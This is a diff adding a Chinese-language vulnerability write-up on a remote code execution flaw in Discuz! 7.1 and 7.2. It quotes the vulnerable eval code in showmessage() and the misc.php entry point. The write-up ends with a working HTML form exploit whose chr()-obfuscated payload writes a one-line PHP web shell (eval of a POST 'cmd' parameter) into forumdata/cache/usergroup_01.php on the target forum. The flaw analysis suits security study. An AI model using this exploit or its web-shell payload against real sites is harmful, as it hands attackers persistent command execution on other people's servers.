@@ -1,0 +1,213 @@
+Discuz! 7.1 & 7.2 远程代码执行漏洞
+
+
+别说明：产生漏洞的$scriptlang数组在安装插件后已经初始化，因此有安装插件的用户不受影响。
+
+漏洞介绍：
+
+Discuz！新版本7.1与7.2版本中的showmessage函数中eval中执行的参数未初始化，可以任意提交，从而可以执行任意PHP命令。
+
+漏洞分析：
+
+下面来分析下这个远程代码执行漏洞，这个问题真的很严重，可以直接写shell的：
+
+一、漏洞来自showmessage函数：
+
+function showmessage($message, $url_forward = '', $extra = '', $forwardtype = 0) {
+
+     extract($GLOBALS, EXTR_SKIP);//危险的用法，未初始化的变量可以直接带进函数，直接导致了问题产生，from www.oldjun.com
+
+     global $hookscriptmessage, $extrahead, $discuz_uid, $discuz_action, $debuginfo, $seccode, $seccodestatus, $fid, $tid, $charset, $show_message, $inajax, $_DCACHE, $advlist;
+
+     define('CACHE_FORBIDDEN', TRUE);
+
+     $hookscriptmessage = $show_message = $message;$messagehandle = 0;
+
+     $msgforward = unserialize($_DCACHE['settings']['msgforward']);
+
+     $refreshtime = intval($msgforward['refreshtime']);
+
+     $refreshtime = empty($forwardtype) ? $refreshtime : ($refreshtime ? $refreshtime : 3);
+
+     $msgforward['refreshtime'] = $refreshtime * 1000;
+
+     $url_forward = empty($url_forward) ? '' : (empty($_DCOOKIE['sid']) && $transsidstatus ? transsid($url_forward) : $url_forward);
+
+     $seccodecheck = $seccodestatus & 2;
+
+     if($_DCACHE['settings']['funcsiteid'] && $_DCACHE['settings']['funckey'] && $funcstatinfo && !IS_ROBOT) {
+
+         $statlogfile = DISCUZ_ROOT.'./forumdata/funcstat.log';
+
+         if($fp = @fopen($statlogfile, 'a')) {
+
+             @flock($fp, 2);
+
+             if(is_array($funcstatinfo)) {
+
+                 $funcstatinfo = array_unique($funcstatinfo);
+
+                 foreach($funcstatinfo as $funcinfo) {
+
+                     fwrite($fp, funcstat_query($funcinfo, $message)."\n");
+
+                 }
+
+             } else {
+
+                 fwrite($fp, funcstat_query($funcstatinfo, $message)."\n");
+
+             }
+
+             fclose($fp);
+
+             $funcstatinfo = $GLOBALS['funcstatinfo'] = '';
+
+         }
+
+     }
+
+
+
+     if(!defined('STAT_DISABLED') && STAT_ID > 0 && !IS_ROBOT) {
+
+         write_statlog($message);
+
+     }
+
+
+
+     if($url_forward && (!empty($quickforward) || empty($inajax) && $msgforward['quick'] && $msgforward['messages'] && @in_array($message, $msgforward['messages']))) {
+
+         updatesession();
+
+         dheader("location: ".str_replace('&amp;', '&', $url_forward));
+
+     }
+
+     if(!empty($infloat)) {
+
+         if($extra) {
+
+             $messagehandle = $extra;
+
+         }
+
+         $extra = '';
+
+     }
+
+     if(in_array($extra, array('HALTED', 'NOPERM'))) {
+
+         $discuz_action = 254;
+
+     } else {
+
+         $discuz_action = 255;
+
+     }
+
+
+
+     include language('messages');
+
+
+
+     $vars = explode(':', $message);//只要含:就可以了
+
+     if(count($vars) == 2 && isset($scriptlang[$vars[0]][$vars[1]])) {//两个数字即可，用:分割
+
+         eval("\$show_message = \"".str_replace('"', '\"', $scriptlang[$vars[0]][$vars[1]])."\";");//$scriptlang未初始化，可以自定义，from www.oldjun.com
+
+     } elseif(isset($language[$message])) {
+
+         $pre = $inajax ? 'ajax_' : '';
+
+         eval("\$show_message = \"".(isset($language[$pre.$message]) ? $language[$pre.$message] : $language[$message])."\";");
+
+         unset($pre);
+
+     }
+
+
+
+     ......
+
+}
+
+二、DZ的全局机制导致了未初始化的参数可以任意提交：
+
+foreach(array('_COOKIE', '_POST', '_GET') as $_request) {
+
+     foreach($$_request as $_key => $_value) {
+
+         $_key{0} != '_' && $$_key = daddslashes($_value);
+
+     }
+
+}
+
+三、misc.php正好有个可以自定义message的点，其实也是未初始化：
+
+elseif($action == 'imme_binding' && $discuz_uid) {
+
+
+
+     if(isemail($id)) {
+
+         $msn = $db->result_first("SELECT msn FROM {$tablepre}memberfields WHERE uid='$discuz_uid'");
+
+         $msn = explode("\t", $msn);
+
+         $id = dhtmlspecialchars(substr($id, 0, strpos($id, '@')));
+
+         $msn = "$msn[0]\t$id";
+
+         $db->query("UPDATE {$tablepre}memberfields SET msn='$msn' WHERE uid='$discuz_uid'");
+
+         showmessage('msn_binding_succeed', 'memcp.php');
+
+     } else {
+
+         if($result == 'Declined') {
+
+             dheader("Location: memcp.php");
+
+         } else {
+
+             showmessage($response['result']);//$response没有初始化，可以自定义，from www.oldjun.com
+
+
+
+         }
+
+     }
+
+
+
+    }
+
+四、漏洞利用：
+
+showmessage函数里$vars = explode(':', $message);然后message可以自己控制，于是就很容易了，参数是两个自定义的数组。
+
+下面是HTML测试代码：
+
+<form method="post" action="http://bbs.XXXX.com/misc.php" enctype="multipart/form-data">
+
+帖子ID，指定一个存在的帖子即可：<input type="text" name="tid" value="1" />
+
+<input type="hidden" name="action" value="imme_binding" />
+
+<input type="hidden" name="response[result]" value="1:2" />
+
+<input type="hidden" name="scriptlang[1][2]" value="${${eval(chr(102).chr(112).chr(117).chr(116).chr(115).chr(40).chr(102).chr(111).chr(112).chr(101).chr(110).chr(40).chr(39).chr(102).chr(111).chr(114).chr(117).chr(109).chr(100).chr(97).chr(116).chr(97).chr(47).chr(99).chr(97).chr(99).chr(104).chr(101).chr(47).chr(117).chr(115).chr(101).chr(114).chr(103).chr(114).chr(111).chr(117).chr(112).chr(95).chr(48).chr(49).chr(46).chr(112).chr(104).chr(112).chr(39).chr(44).chr(39).chr(119).chr(39).chr(41).chr(44).chr(39).chr(60).chr(63).chr(112).chr(104).chr(112).chr(32).chr(101).chr(118).chr(97).chr(108).chr(40).chr(36).chr(95).chr(80).chr(79).chr(83).chr(84).chr(91).chr(99).chr(109).chr(100).chr(93).chr(41).chr(63).chr(62).chr(39).chr(41).chr(59))}}" />
+
+<input type="submit" name="topicsubmit" value="提交" class="submit" />
+
+</form>
+
+forumdata/cache/usergroup_01.php cmd 生成的一句话
+
+ 
+
